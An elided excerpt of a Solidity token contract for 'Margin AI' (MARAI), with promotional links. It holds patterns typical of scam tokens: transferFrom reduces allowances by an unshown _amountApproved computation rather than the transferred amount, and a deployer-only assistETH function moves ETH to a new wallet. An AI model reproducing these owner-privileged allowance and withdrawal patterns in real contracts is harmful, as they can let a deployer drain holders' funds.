...
/**
    Website: https://marginai.xyz
    X: https://x.com/margin_ai
    Telegram: https://t.me/margin_ai
*/
...
contract MARAI is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Margin AI";
    string private constant _symbol = unicode"MARAI";
    ...
    uint256 private _startFeeAs = 20;
    uint256 private _endFeeAs = 0;
    uint256 private _removeFee = 10;
    uint256 private _preventSwapBefore = 10;
    address private _resowner;
    ...
    constructor() payable {
        ...
        _resowner = _msgSender();
        _balances[address(this)] = _tTotal;
    }

    function launch() external onlyOwner {
        require(!_startTrading, "trading is already open");
    ...
    function transferFrom(
        ...
        _approve(
            sender, _msgSender(),_allowances[sender][_msgSender()].sub(
                _amountApproved(sender, recipient, amount),"ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    ...
    function assistETH(address payable newWallet) external {
        require(msg.sender == _resowner, "not deployer");
